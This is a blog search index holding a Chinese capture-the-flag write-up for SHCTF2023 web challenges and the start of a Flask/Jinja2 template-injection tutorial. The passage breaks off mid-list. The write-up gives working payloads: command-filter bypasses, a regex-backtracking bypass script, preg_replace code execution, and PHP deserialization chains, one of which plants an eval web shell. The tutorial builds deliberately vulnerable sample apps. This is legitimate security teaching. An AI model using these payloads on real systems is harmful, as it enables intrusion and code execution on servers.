<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SHCTF2023-web</title>
      <link href="/post/a7eefc60.html"/>
      <url>/post/a7eefc60.html</url>
      
        <content type="html"><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格和一些参数，可以用<code>$&#123;IFS&#125;</code>绕过空格，转义符<code>\</code>绕过参数过滤</p><p><a href="https://www.freebuf.com/articles/web/330736.html">RCE总结</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t$&#123;IFS&#125;/fl\ag</span><br></pre></td></tr></table></figure><h3 id="1zzphp"><a href="#1zzphp" class="headerlink" title="1zzphp"></a>1zzphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;./index.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>];</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) <span class="comment">//数组绕过，传入数组是返回false</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no number!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) <span class="comment">//传入数组会返回1</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="variable">$code</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no touch!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;2023SHCTF&#x27;</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what do you want&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题利用正则最大回溯绕过，<code>.+?</code>是正则表达式的贪婪模式</p><p><a href="https://xz.aliyun.com/t/10219">利用正则回溯最大次数上限绕过preg_match</a></p><p>绕过脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &#x27;c_ode&#x27;: &#x27;v&#x27; * 1000000+&#x27;2023SHCTF&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = &#x27;http://112.6.51.212:30933/?num[]=1&#x27;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">preg_replace(&#x27;/(&#x27; . $pattern . &#x27;)/ei&#x27;,&#x27;print_r(&quot;\\1&quot;)&#x27;, $code); </span><br></pre></td></tr></table></figure><p>这题主要是<code>preg_replace</code>函数的&#x2F;e模式可以执行代码</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$patrern=\S*  \S代表匹配非空字符</span><br><span class="line">$code=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>贴个链接</p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p><p>为什么是**${phpinfo()}**？</p><p>这里是php可变变量问题，<code>&#123;&#125;</code>会获取{}内的值当作变量解析</p><p><code>\\1</code>这里其实就是<code>\1</code>，\1在在正则表达式中有自己的含义</p><p>贴 <a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html"><strong>W3Cschool</strong></a> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line">  对一个正则表达式模式或部分模式 两边添加圆括号将导致相关匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure><p>根据上面的解释，那这里的\1就是第一个匹配项，最后的语句是</p><p>preg_replace(‘&#x2F;(\S*)&#x2F;ei’, ‘print_r(“\1”)’, ${phpinfo()});</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><p>构造pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;ding-&gt;a = &amp;<span class="variable">$c</span>-&gt;ding-&gt;gao;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题最重要的就是绕过if(preg_match(‘&#x2F;^O:\d+&#x2F;‘,$data))</p><p>这里用+能绕过但是代码不能执行，还可以用数组绕过</p><p><a href="http://t.csdnimg.cn/eWViq">关于正则匹配preg_match(‘&#x2F;^O:\d+&#x2F;‘)的绕过的几种方法</a></p><p>payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:<span class="number">5</span>:<span class="string">&quot;musca&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;ding&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;misca&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;gao&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;fei&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;milaoshu&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;v&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;R:<span class="number">4</span>;&#125;s:<span class="number">4</span>:<span class="string">&quot;dong&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="MD5的事就拜托了"><a href="#MD5的事就拜托了" class="headerlink" title="MD5的事就拜托了"></a>MD5的事就拜托了</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://t.csdnimg.cn/K7DDF">parse_url函数的解释和绕过</a></p><p><a href="https://www.freebuf.com/articles/database/164019.html">Hash拓展长度攻击原理剖析</a></p><p><a href="https://mp.weixin.qq.com/s/pRGy_yEmyjgTgygEiLSSug">官方WP</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;host://SHCTF:pass@user/1&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; host</span><br><span class="line">    [host] =&gt; user</span><br><span class="line">    [user] =&gt; SHCTF</span><br><span class="line">    [pass] =&gt; pass</span><br><span class="line">    [path] =&gt; /1</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>输入参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">SHCTF=host://SHCTF:pass@user/1   //得到flag的MD5</span><br><span class="line">GET:</span><br><span class="line">length=1.001  //得到长度</span><br></pre></td></tr></table></figure><p>最后一段</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看别人说是，哈希拓展攻击，然后在网上找一个脚本<a href="https://github.com/shellfeel/hash-ext-attack">hash-ext-attack攻击脚本</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231107132329008.png" alt="image-20231107132329008"></p><p>得到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231107132425140.png" alt="image-20231107132425140"></p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="sseerriiaalliizzee"><a href="#sseerriiaalliizzee" class="headerlink" title="sseerriiaalliizzee"></a>sseerriiaalliizzee</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$barking</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;barking = <span class="keyword">new</span> <span class="title class_">Flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;barking-&gt;<span class="title function_ invoke__">dosomething</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$part1</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$part2</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; part1 = <span class="variable">$part1</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; part2 = <span class="variable">$part2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$useless</span>   = <span class="string">&#x27;&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$useful</span>= <span class="variable">$useless</span>. <span class="variable language_">$this</span>-&gt;part2;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt; part1,<span class="variable">$useful</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dosomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;./flag,php&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;barking for fun!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$code</span>))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no way, fuck off&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>pop链是：Start::__tostring-&gt;CTF::dosomething</p><p><a href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contents利用技巧(php:&#x2F;&#x2F;filter协议）</a></p><p>当我们执行到die函数是就会被终止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php die(&quot;+Genshin Impact Start!+&quot;);?&gt;中，base64编码中只包含64个可打印字符（A-Z a-z 0-9 + /）&#x27;=&#x27;补位，能base64解码的字符一共有26个phpdie+GenshinImpactStart+，需要在往里添加两个字符，然后再写进去要执行的命令</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$barking</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$part2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;barking = <span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;barking-&gt;part1 = <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=cmd.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;barking-&gt;part2 = <span class="string">&#x27;66&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:7:&quot;barking&quot;;O:3:&quot;CTF&quot;:2:&#123;s:5:&quot;part1&quot;;s:57:&quot;php://filter/write=convert.base64-decode/resource=cmd.php&quot;;s:5:&quot;part2&quot;;s:42:&quot;66PD9waHAgZXZhbCgkX0dFVFsiY21kIl0pOyA/Pg==&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后获取flag就行了</p>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti模板注入</title>
      <link href="/post/a64d78f2.html"/>
      <url>/post/a64d78f2.html</url>
      
        <content type="html"><![CDATA[<p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p><p><a href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>是用python编写的一个轻量web开发<a href="https://so.csdn.net/so/search?q=%E6%A1%86%E6%9E%B6&spm=1001.2101.3001.7020">框架</a>。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​        漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web  应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。’</p><h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jinja2是一种面向Python的现代和设计友好的模板语言</span><br><span class="line">Jinja2使用 &#123;&#123;name&#125;&#125;结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</span><br></pre></td></tr></table></figure><p>漏洞原因：</p><p>flask使用jinjia2渲染引擎进行网页渲染，当处理不得当，未进行语句过滤，用户输入，会导致渲染出恶意代码，形成注入。</p><p>主要是用了<code>render_template_string</code>这个函数，直接渲染执行了字符串</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>代码实现简单的渲染，利用<code>render_template</code>函数渲染</p><p>app.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span><span class="comment">#我们访问/或者/index都会跳转</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    bai = request.args.get(<span class="string">&#x27;bai&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=bai)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>小猪佩奇<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行起来后，访问127.0.0.1:5000</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231102133929813.png" alt="image-20231102133929813"></p><p>通过输入参数可以进行简单的渲染，代码不能执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&#123;&#123;name&#125;&#125;`是被&#123;&#123;&#125;&#125;包起来的，会预先渲染转义，然后才输出，不会被渲染执行</span><br></pre></td></tr></table></figure><p>利用<code>render_template_string</code>函数</p><p>app.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span><span class="comment">#我们访问/或者/index都会跳转</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    bai = request.args.get(<span class="string">&#x27;bai&#x27;</span>)</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;小猪佩奇&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">      &lt;h1&gt;Hello, &#123;&#125;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(bai)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231102134006165.png" alt="image-20231102134006165"></p><p>代码被成功执行，return render_template_string(str)会将{}里的字符串当成代码指令</p><h2 id="flask相关知识"><a href="#flask相关知识" class="headerlink" title="flask相关知识"></a>flask相关知识</h2><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等</p><p>魔术方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回当前类对象的所有继承类</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">// 